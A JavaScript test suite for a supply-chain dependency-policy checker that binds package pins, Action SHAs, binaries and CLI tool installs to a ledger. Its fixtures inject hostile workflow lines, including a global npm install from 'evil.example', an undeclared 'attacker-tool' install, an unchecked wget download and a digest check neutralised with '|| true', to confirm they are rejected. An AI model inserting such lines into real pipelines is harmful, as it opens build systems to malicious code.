import assert from "node:assert/strict";
import { readFile, writeFile } from "node:fs/promises";
import { join } from "node:path";
import { test } from "node:test";
import {
  loadDependencyPolicy,
  verifyLocalDependencyPolicy,
  verifyRemoteDependencyPolicy,
} from "../scripts/check-dependency-policy.mjs";
import {
  DAY_MS,
  fixture,
  NOW,
  replace,
  ROOT,
} from "./dependency-policy-fixtures.mjs";

test("repository dependency pins match the machine-readable ledger and age floor", async () => {
  await verifyLocalDependencyPolicy(ROOT, NOW);
});

test("CI and publish invoke the remote policy check with a GitHub token", async () => {
  const pkg = JSON.parse(await readFile(join(ROOT, "package.json"), "utf8"));
  assert.equal(pkg.scripts["check:deps"], "node scripts/check-dependency-policy.mjs");
  assert.equal(pkg.scripts["check:deps:remote"], "node scripts/check-dependency-policy.mjs --verify-remote");
  for (const file of ["ci.yml", "publish.yml"]) {
    const workflow = await readFile(join(ROOT, `.github/workflows/${file}`), "utf8");
    assert.match(
      workflow,
      /name: enforce dependency policy\s+env:\s+GITHUB_TOKEN: \$\{\{ github\.token \}\}\s+run: node scripts\/check-dependency-policy\.mjs --verify-remote/,
      `${file} runs the live upstream evidence check`,
    );
  }
});

test("the Hono peer floor in the package contract matches the manifest", async () => {
  const pkg = JSON.parse(await readFile(join(ROOT, "package.json"), "utf8"));
  const contract = await readFile(join(ROOT, "docs/contracts/15-package-and-export-map.md"), "utf8");
  const expected = "The optional Hono peer range is **`" + pkg.peerDependencies.hono + "`**";
  assert.ok(contract.includes(expected), "package contract records the exact Hono peer floor");
});

test("package, action SHA, and action evidence drift each fail closed", async (t) => {
  await t.test("direct package pin", async () => {
    const root = await fixture();
    const policy = await loadDependencyPolicy(root);
    await replace(
      join(root, "package.json"),
      `"hono": "${policy.packages.hono.version}"`,
      '"hono": "0.0.0"',
    );
    await assert.rejects(
      verifyLocalDependencyPolicy(root, NOW),
      new RegExp(`hono: package pin 0\\.0\\.0 != ledger ${policy.packages.hono.version.replaceAll(".", "\\.")}`),
    );
  });

  await t.test("optional dependency pin", async () => {
    const root = await fixture();
    const path = join(root, "package.json");
    const pkg = JSON.parse(await readFile(path, "utf8"));
    pkg.optionalDependencies = { undici: "7.16.0" };
    await writeFile(path, `${JSON.stringify(pkg, null, 2)}\n`);
    await assert.rejects(verifyLocalDependencyPolicy(root, NOW), /undici: direct package pin is missing from the ledger/);
  });

  await t.test("workflow SHA", async () => {
    const root = await fixture();
    const policy = await loadDependencyPolicy(root);
    await replace(
      join(root, ".github/workflows/ci.yml"),
      `actions/checkout@${policy.actions["actions/checkout"].sha}`,
      `actions/checkout@${"0".repeat(40)}`,
    );
    await assert.rejects(verifyLocalDependencyPolicy(root, NOW), /actions\/checkout pin does not match the ledger/);
  });

  await t.test("version/date comment", async () => {
    const root = await fixture();
    const policy = await loadDependencyPolicy(root);
    const setupNode = policy.actions["actions/setup-node"];
    await replace(
      join(root, ".github/workflows/codeql.yml"),
      `${setupNode.tag} (${setupNode.published.slice(0, 10)})`,
      "bogus action evidence",
    );
    await assert.rejects(verifyLocalDependencyPolicy(root, NOW), /version\/date comment does not match the ledger/);
  });
});

test("third-party action quarantine rejects a ledger date younger than 15 days", async () => {
  const root = await fixture();
  const policy = await loadDependencyPolicy(root);
  const checkout = policy.actions["actions/checkout"];
  const youngPublished = new Date(NOW.getTime() - DAY_MS).toISOString();
  await replace(
    join(root, "docs/dependency-ledger.md"),
    `"tag": "${checkout.tag}",\n      "published": "${checkout.published}"`,
    `"tag": "${checkout.tag}",\n      "published": "${youngPublished}"`,
  );
  await assert.rejects(
    verifyLocalDependencyPolicy(root, NOW),
    (error) => error instanceof Error
      && error.message.includes(`actions/checkout: ${youngPublished} is younger than ${policy.minimumAgeDays} days`),
  );
});

test("workspace and workflow pnpm settings cannot bypass the recorded pins", async (t) => {
  await t.test("workspace age floor", async () => {
    const root = await fixture();
    await replace(join(root, "pnpm-workspace.yaml"), "minimumReleaseAge: 21600", "minimumReleaseAge: 0");
    await assert.rejects(
      verifyLocalDependencyPolicy(root, NOW),
      /pnpm-workspace\.yaml minimumReleaseAge 0 != ledger 21600/,
    );
  });

  await t.test("workflow version override", async () => {
    const root = await fixture();
    const policy = await loadDependencyPolicy(root);
    const pnpmSetup = policy.actions["pnpm/action-setup"];
    const pin = `pnpm/action-setup@${pnpmSetup.sha} # ${pnpmSetup.tag} (${pnpmSetup.published.slice(0, 10)})`;
    await replace(
      join(root, ".github/workflows/ci.yml"),
      pin,
      `${pin}\n        with:\n          version: 11.0.0`,
    );
    await assert.rejects(
      verifyLocalDependencyPolicy(root, NOW),
      /pnpm\/action-setup must read packageManager without a version override/,
    );
  });
});

test("only the documented first-party repository can claim the age exception", async () => {
  const root = await fixture();
  await replace(
    join(root, "docs/dependency-ledger.md"),
    '"actions/checkout": {\n      "sha":',
    '"actions/checkout": {\n      "firstPartyException": true,\n      "sha":',
  );
  await assert.rejects(verifyLocalDependencyPolicy(root, NOW), /actions\/checkout: is not eligible for the first-party exception/);
});

test("remote evidence binds action tags and npm versions to recorded dates", async () => {
  const policy = await loadDependencyPolicy(ROOT);
  const fetchImpl = async (input, init) => {
    const url = String(input);
    // The GitHub token authenticates GitHub calls only; the npm registry
    // never receives it.
    if (new URL(url).hostname === "api.github.com") assert.equal(init?.headers?.Authorization, "Bearer not-a-secret", `token sent to ${url}`);
    else assert.equal(init?.headers?.Authorization, undefined, `no token to ${url}`);
    if (url.includes("api.github.com/advisories")) {
      const parsed = new URL(url);
      const advisoryId = parsed.pathname.startsWith("/advisories/")
        ? decodeURIComponent(parsed.pathname.slice("/advisories/".length))
        : parsed.searchParams.get("cve_id");
      const exception = policy.advisoryExceptions
        .find((record) => record.advisoryIds.includes(advisoryId));
      const transitive = Object.entries(policy.transitivePins)
        .find(([, record]) => record.advisoryIds.includes(advisoryId));
      const packageName = exception?.package ?? transitive?.[0];
      const adoptedVersion = exception?.adoptedVersion ?? transitive?.[1].version;
      assert.ok(packageName && adoptedVersion, `known advisory URL: ${url}`);
      const firstPatchedVersions = packageName === "fast-uri"
        ? {
            "GHSA-4c8g-83qw-93j6": ["2.4.1", "3.1.3", "4.0.1"],
            "GHSA-v2hh-gcrm-f6hx": ["2.4.3", "3.1.4", "4.1.1"],
            "GHSA-7p8r-x3mc-p8w7": ["2.4.4", "3.1.5", "4.1.2"],
          }[advisoryId]
        : [adoptedVersion];
      assert.ok(firstPatchedVersions, `known advisory version lines: ${advisoryId}`);
      return Response.json({
        ghsa_id: advisoryId.startsWith("GHSA-") ? advisoryId : null,
        cve_id: advisoryId.startsWith("CVE-") ? advisoryId : null,
        vulnerabilities: firstPatchedVersions.map((firstPatchedVersion) => ({
          package: { ecosystem: "npm", name: packageName },
          first_patched_version: firstPatchedVersion,
        })),
      });
    }
    if (url.includes("api.github.com/repos/")) {
      // A ledger binary's release is asked for its publication date the same
      // way an action's tag is, so the stub answers from either record.
      const binary = Object.entries(policy.binaries ?? {}).find(([, entry]) => {
        const parsed = /^https:\/\/github\.com\/([^/]+\/[^/]+)\/releases\/download\/([^/]+)\//.exec(entry.url ?? "");
        return parsed !== null && url === `https://api.github.com/repos/${parsed[1]}/releases/tags/${parsed[2]}`;
      });
      if (binary) return Response.json({ published_at: binary[1].published });
      const action = Object.entries(policy.actions).find(([repo]) => url.includes(`/repos/${repo}/`));
      assert.ok(action, `known action URL: ${url}`);
      const [, record] = action;
      if (url.includes("/releases/tags/")) return Response.json({ published_at: record.published });
      return Response.json({
        sha: record.sha,
        commit: { committer: { date: record.published } },
      });
    }
    const name = decodeURIComponent(new URL(url).pathname.slice(1));
    const record = policy.packages[name] ?? policy.transitivePins[name] ?? policy.tools?.[name];
    assert.ok(record, `known package URL: ${url}`);
    const time = { [record.version]: record.published };
    if (name === "fast-uri") time["3.1.4"] = record.published;
    return Response.json({ time });
  };
  await verifyRemoteDependencyPolicy(policy, { fetchImpl, token: "not-a-secret" });

  const staleTransitive = structuredClone(policy);
  staleTransitive.transitivePins["fast-uri"].version = "3.1.4";
  await assert.rejects(
    verifyRemoteDependencyPolicy(staleTransitive, { fetchImpl, token: "not-a-secret" }),
    /fast-uri: advisory .* first patched version 3\.1\.5 is newer than adopted 3\.1\.4/,
  );

  const badFetch = async (input, init) => {
    const url = String(input);
    if (url.includes("/repos/actions/checkout/commits/")) return Response.json({ sha: "0".repeat(40) });
    return await fetchImpl(input, init);
  };
  // A binary cannot vouch for its own age: a backdated ledger date is caught
  // against the release the recorded URL names.
  const backdatedFetch = async (input, init) => {
    const url = String(input);
    if (url.includes("/repos/cloudflare/cloudflared/releases/tags/")) return Response.json({ published_at: "2020-01-01T00:00:00Z" });
    return await fetchImpl(input, init);
  };
  await assert.rejects(
    verifyRemoteDependencyPolicy(policy, { fetchImpl: backdatedFetch, token: "not-a-secret" }),
    (error) => error instanceof Error && error.message.includes("cloudflared: release date does not match the ledger"),
  );
  await assert.rejects(
    verifyRemoteDependencyPolicy(policy, { fetchImpl: badFetch, token: "not-a-secret" }),
    (error) => error instanceof Error
      && error.message.includes(`actions/checkout: ${policy.actions["actions/checkout"].tag} does not resolve to the ledger SHA`),
  );

});

test("a binary a workflow downloads is bound to the ledger by URL, digest, version, and age", async (t) => {
  await t.test("digest drift", async () => {
    const root = await fixture();
    const policy = await loadDependencyPolicy(root);
    const record = policy.binaries.cloudflared;
    await replace(join(root, ".github/workflows/live.yml"), `echo "${record.sha256}  `, `echo "${"0".repeat(64)}  `);
    await assert.rejects(verifyLocalDependencyPolicy(root, NOW), /cloudflared digest does not match the ledger/);
  });
  await t.test("undeclared download", async () => {
    const root = await fixture();
    const policy = await loadDependencyPolicy(root);
    await replace(join(root, ".github/workflows/live.yml"), policy.binaries.cloudflared.url, policy.binaries.cloudflared.url.replace("2026.7.3", "2026.7.2"));
    await assert.rejects(verifyLocalDependencyPolicy(root, NOW), /is missing from the ledger|is not downloaded by any workflow/);
  });
  await t.test("quarantine", async () => {
    const root = await fixture();
    const policy = await loadDependencyPolicy(root);
    const young = new Date(NOW.getTime() - DAY_MS).toISOString();
    await replace(join(root, "docs/dependency-ledger.md"), `"published": "${policy.binaries.cloudflared.published}"`, `"published": "${young}"`);
    await assert.rejects(verifyLocalDependencyPolicy(root, NOW), (error) => error instanceof Error && error.message.includes(`cloudflared: ${young} is younger than`));
  });
});

test("a tool a workflow installs with npm is bound to the ledger by name, version, and age", async (t) => {
  await t.test("version drift", async () => {
    const root = await fixture();
    const policy = await loadDependencyPolicy(root);
    const record = policy.tools["@openai/codex"];
    await replace(join(root, ".github/workflows/live.yml"), `@openai/codex@${record.version}`, "@openai/codex@0.0.1");
    await assert.rejects(verifyLocalDependencyPolicy(root, NOW), /@openai\/codex@0\.0\.1 does not match ledger/);
  });
  await t.test("undeclared install", async () => {
    const root = await fixture();
    const policy = await loadDependencyPolicy(root);
    const record = policy.tools["@openai/codex"];
    await replace(join(root, ".github/workflows/live.yml"), `@openai/codex@${record.version}`, `@openai/codex-cli@${record.version}`);
    await assert.rejects(verifyLocalDependencyPolicy(root, NOW), (error) => error instanceof Error
      && error.message.includes("installed tool @openai/codex-cli is missing from the ledger")
      && error.message.includes("@openai/codex: ledger tool is not installed by any workflow"));
  });
  await t.test("quarantine", async () => {
    const root = await fixture();
    const policy = await loadDependencyPolicy(root);
    const young = new Date(NOW.getTime() - DAY_MS).toISOString();
    await replace(join(root, "docs/dependency-ledger.md"), `"published": "${policy.tools["@anthropic-ai/claude-code"].published}"`, `"published": "${young}"`);
    await assert.rejects(verifyLocalDependencyPolicy(root, NOW), (error) => error instanceof Error && error.message.includes(`@anthropic-ai/claude-code: ${young} is younger than`));
  });
  await t.test("another spelling of a global install is bound too", async () => {
    const root = await fixture();
    await replace(join(root, ".github/workflows/live.yml"), "      - name: rehearse", "      - run: npm i --global attacker-tool@1.0.0\n      - name: rehearse");
    await assert.rejects(verifyLocalDependencyPolicy(root, NOW), /installed tool attacker-tool is missing from the ledger/);
  });
  await t.test("an unpinned global install is refused", async () => {
    const root = await fixture();
    const policy = await loadDependencyPolicy(root);
    await replace(join(root, ".github/workflows/live.yml"), `@openai/codex@${policy.tools["@openai/codex"].version}`, "@openai/codex@latest");
    await assert.rejects(verifyLocalDependencyPolicy(root, NOW), /@openai\/codex@unpinned does not match ledger/);
  });
  await t.test("a spec the parser cannot read is refused, never skipped", async () => {
    const root = await fixture();
    await replace(join(root, ".github/workflows/live.yml"), "      - name: rehearse", "      - run: npm install -g https://evil.example/pkg.tgz\n      - name: rehearse");
    await assert.rejects(verifyLocalDependencyPolicy(root, NOW), /installed tool https:\/\/evil\.example\/pkg\.tgz is missing from the ledger/);
  });
  await t.test("a digest line that checks another file, or discards its result, does not count", async () => {
    for (const [from, to] of [
      ['  $RUNNER_TEMP/cloudflared" | sha256sum -c -', '  $RUNNER_TEMP/other-file" | sha256sum -c -'],
      ['| sha256sum -c -\n', "| sha256sum -c - || true\n"],
    ]) {
      const root = await fixture();
      await replace(join(root, ".github/workflows/live.yml"), from, to);
      await assert.rejects(verifyLocalDependencyPolicy(root, NOW), /cloudflared is downloaded without a digest check/);
    }
  });
  await t.test("a release asset fetched without its digest line is refused", async () => {
    const root = await fixture();
    await replace(join(root, ".github/workflows/live.yml"), "      - name: rehearse",
      "      - run: wget -O /tmp/x https://github.com/cloudflare/cloudflared/releases/download/2026.7.3/cloudflared-linux-amd64\n      - name: rehearse");
    await assert.rejects(verifyLocalDependencyPolicy(root, NOW), /cloudflared is downloaded without a digest check/);
  });
});
